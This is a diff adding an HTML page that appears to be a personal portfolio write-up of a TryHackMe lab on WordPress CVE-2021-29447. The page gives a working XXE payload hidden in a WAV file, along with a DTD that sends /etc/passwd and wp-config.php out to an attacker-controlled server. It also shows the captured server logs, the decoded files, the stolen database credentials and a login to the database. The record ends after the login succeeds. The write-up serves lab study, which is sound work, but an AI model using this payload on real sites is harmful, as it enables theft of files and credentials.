@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wordpress CVE 2021 29447 | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 12px;
+            background: #0f172a;
+            padding: 0 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: #22c55e;
+            letter-spacing: 2px;
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            font-weight: 700;
+            z-index: 10;
+        }
+        .nav-index { color: #22c55e; opacity: 0.5; margin-right: 0.5rem; font-weight: bold; }
+        .diag-card { background: rgba(15, 23, 42, 0.5); border: 1px solid rgba(255, 255, 255, 0.05); padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #64748b; border-radius: 4px; }
+        .diag-label { color: #94a3b8; text-transform: uppercase; margin-bottom: 4px; display: block; font-size: 8px; letter-spacing: 1px; }
+        .diag-value { color: #22c55e; }
+        .diag-blink { animation: blink 1s step-end infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        body { 
+            background-image: 
+                linear-gradient(to bottom, rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.95)),
+                url('../images/world-map-bg.png');
+            background-attachment: fixed;
+            background-size: cover;
+            background-position: center;
+            color: #cbd5e1; 
+        }
+    </style>
+</head>
+<body class="p-8 md:p-16 bg-transparent selection:bg-accent-green selection:text-slate-900">
+    <nav class="mb-12 font-mono text-sm">
+        <a href="../index.html" class="text-accent-cyan hover:underline hover:text-white transition-colors">Return_to_Portfolio</a>
+    </nav>
+    <article class="max-w-7xl mx-auto">
+        <header class="mb-12">
+            <div class="text-accent-green font-mono text-sm mb-2 uppercase">tryhackme</div>
+            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">Wordpress CVE 2021 29447</h1>
+            <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
+        </header>
+        <div class="markdown-content">
+            <h2>cve-2021-29447</h2>
+<h2>&gt; cve-2021-29447</h2>
+<h2>cve-2021-29447</h2>
+<blockquote>
+<p>wordpress login</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="n">user</span><span class="o">:</span><span class="w"> </span><span class="n">test</span><span class="o">-</span><span class="n">corp</span>
+<span class="n">password</span><span class="o">:</span><span class="w"> </span><span class="n">test</span>
+</code></pre></div>
+
+<blockquote>
+<p>after in my pc create poc.wav</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="n">cat</span><span class="w"> </span><span class="n">poc</span><span class="p">.</span><span class="n">wav</span>
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">en</span><span class="w"> </span><span class="err">&#39;</span><span class="n">RIFF</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00WAVEiXML</span><span class="err">\</span><span class="n">x7b</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="o">&lt;?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span><span class="o">?&gt;&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">ANY</span><span class="p">[</span><span class="o">&lt;!</span><span class="n">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="sc">&#39;&quot;&#39;</span><span class="s">&quot;&#39;http://YOURSEVERIP:PORT/NAMEEVIL.dtd&#39;&quot;</span><span class="sc">&#39;&quot;&#39;</span><span class="o">&gt;%</span><span class="n">remote</span><span class="p">;</span><span class="k">%init</span><span class="p">;</span><span class="o">%</span><span class="n">trick</span><span class="p">;]</span><span class="o">&gt;</span><span class="err">\</span><span class="n">x00</span><span class="err">&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">payload</span><span class="p">.</span><span class="n">wav</span>
+</code></pre></div>
+
+<blockquote>
+<p>remember to add <code>http://YOURSEVERIP:PORT</code> to you ip and port and add <code>NAMEEVIL.dtd</code> name this you dtd file create that dtd file like this,</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">file</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;</span><span class="k">&gt;</span>
+<span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">init</span> <span class="s2">&quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://YOURSERVERIP:PORT/?p=%file;&#39;&gt;&quot;</span> <span class="k">&gt;</span>
+</code></pre></div>
+
+<blockquote>
+<p>and also add &amp; change your details,</p>
+<p>now you have all file so upload poc.wav file to wordpress media section and before that open php server</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code> php -S 0.0.0.0:1234
+</code></pre></div>
+
+<blockquote>
+<p>and after you upload that wav.poc file you get no of encode text like this</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>❯ php -S 0.0.0.0:1234
+[Fri Oct 10 09:35:06 2025] PHP 8.4.11 Development Server (http://0.0.0.0:1234) started
+[Fri Oct 10 09:35:33 2025] 10.201.83.44:41890 Accepted
+[Fri Oct 10 09:35:33 2025] 10.201.83.44:41890 [200]: GET /test.dtd
+[Fri Oct 10 09:35:33 2025] 10.201.83.44:41890 Closing
+[Fri Oct 10 09:35:34 2025] 10.201.83.44:41892 Accepted
+[Fri Oct 10 09:35:34 2025] 10.201.83.44:41892 [404]: GET /?p=hVTbjpswEH3fr+CxlYLMLTc/blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+9gxYY1p+4REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzL/oawFilvxOOFospOwLBf5UTLvTvBVA/A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RD/iSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+3BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/dOnck9s2g+6bEh2Z+O1f3u/IpWxC05rvr/vtTsJf2Vpx3zv0X - No such file or directory
+[Fri Oct 10 09:35:34 2025] 10.201.83.44:41892 Closing
+[Fri Oct 10 09:35:36 2025] 10.201.83.44:41894 Accepted
+[Fri Oct 10 09:35:36 2025] 10.201.83.44:41894 [200]: GET /test.dtd
+[Fri Oct 10 09:35:36 2025] 10.201.83.44:41894 Closing
+[Fri Oct 10 09:35:37 2025] 10.201.83.44:41896 Accepted
+[Fri Oct 10 09:35:37 2025] 10.201.83.44:41896 [404]: GET /?p=hVTbjpswEH3fr+CxlYLMLTc/blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+9gxYY1p+4REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzL/oawFilvxOOFospOwLBf5UTLvTvBVA/A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RD/iSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+3BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/dOnck9s2g+6bEh2Z+O1f3u/IpWxC05rvr/vtTsJf2Vpx3zv0X - No such file or directory 
+</code></pre></div>
+
+<blockquote>
+<p>So you got you need info but all info not readable so to convert into readable decode like this,</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="nx">nano</span><span class="w"> </span><span class="nx">decode</span><span class="p">.</span><span class="nx">php</span>
+<span class="w">    </span><span class="sb">```</span>
+<span class="sb">    &gt; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">zlib_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;base64her&#39;</span><span class="p">));</span>
+
+    <span class="o">&gt;</span> <span class="nx">so</span> <span class="nx">to</span> <span class="nx">decode</span> <span class="nx">add</span> <span class="k">and</span> <span class="nx">run</span>
+    <span class="sb">```</span>
+
+<span class="sb">        ```</span>
+        <span class="o">&gt;</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">zlib_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;hVTbjpswEH3fr+CxlYLMLTc/blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+9gxYY1p+4REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzL/oawFilvxOOFospOwLBf5UTLvTvBVA/A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RD/iSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+3BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/dOnck9s2g+6bEh2Z+O1f3u/IpWxC05rvr/vtTsJf2Vpx3zv0X&#39;</span><span class="p">));</span>
+
+        <span class="sb">``</span><span class="err">`</span>
+</code></pre></div>
+
+<blockquote>
+<p>you get,</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">php</span><span class="w"> </span><span class="n">decode</span><span class="o">.</span><span class="n">php</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span><span class="w"> </span><span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Time</span><span class="w"> </span><span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">netif</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">resolve</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">bus</span><span class="o">-</span><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="n">systemd</span><span class="w"> </span><span class="n">Bus</span><span class="w"> </span><span class="n">Proxy</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">108</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">110</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">dbus</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">111</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+<span class="n">stux</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">29447</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">stux</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mysql</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">117</span><span class="p">:</span><span class="n">MySQL</span><span class="w"> </span><span class="n">Server</span><span class="p">,,,:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</code></pre></div>
+
+<blockquote>
+<p>to get sql database info change dtd like this</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="err">!ENTITY</span> <span class="ni">% file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/`etc/passwd`&quot;&gt;</span>
+<span class="ni">&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25;</span> <span class="err">trick</span> <span class="kc">SYSTEM</span> <span class="s1">&#39;http://10.21.16.42:1234/?p=%file;&#39;</span><span class="k">&gt;</span><span class="err">&quot;</span> <span class="k">&gt;</span>
+</code></pre></div>
+
+<blockquote>
+<p>your original command looks like this in dtd therefore you get above info to get database info we have to change dtd file we know wordpress database store like this <code>var/www/html/wp-config.php</code> so we change that dtd file like this</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="err">!ENTITY</span> <span class="ni">% file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php&quot;&gt;</span>
+<span class="ni">&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25;</span> <span class="err">trick</span> <span class="kc">SYSTEM</span> <span class="s1">&#39;http://10.21.16.42:1234/?p=%file;&#39;</span><span class="k">&gt;</span><span class="err">&quot;</span> <span class="k">&gt;</span>
+</code></pre></div>
+
+<blockquote>
+<p>now start php server and you get database info,</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="o">/**</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s">&#39;DB_NAME&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;wordpressdb2&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="o">/**</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s">&#39;DB_USER&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;thedarktangent&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="o">/**</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">*/</span>
+<span class="n">define</span><span class="p">(</span><span class="w"> </span><span class="s">&#39;DB_PASSWORD&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;sUp3rS3cret132&#39;</span><span class="w"> </span><span class="p">);</span>
+</code></pre></div>
+
+<blockquote>
+<p>Using those username &amp; pwd login to database</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>❯ mysql -h 10.201.83.44 -u thedarktangent -p
+
+Enter password: 
+ERROR 2026 (HY000): TLS/SSL error: Certificate verification failure: The certificate is NOT trusted.
+</code></pre></div>
+
+<blockquote>
+<p>But this error comes so login old way</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="nt">mysql</span><span class="w"> </span><span class="nt">-h</span><span class="w"> </span><span class="nt">10</span><span class="p">.</span><span class="nc">201</span><span class="p">.</span><span class="nc">83</span><span class="p">.</span><span class="nc">44</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nt">thedarktangent</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nt">--ssl</span><span class="o">=</span><span class="nt">0</span>
+
+<span class="nt">Enter</span><span class="w"> </span><span class="nt">password</span><span class="o">:</span><span class="w"> </span>
+<span class="nt">Welcome</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">the</span><span class="w"> </span><span class="nt">MariaDB</span><span class="w"> </span><span class="nt">monitor</span><span class="o">.</span><span class="w">  </span><span class="nt">Commands</span><span class="w"> </span><span class="nt">end</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">or</span><span class="w"> </span><span class="err">\</span><span class="nt">g</span><span class="o">.</span>
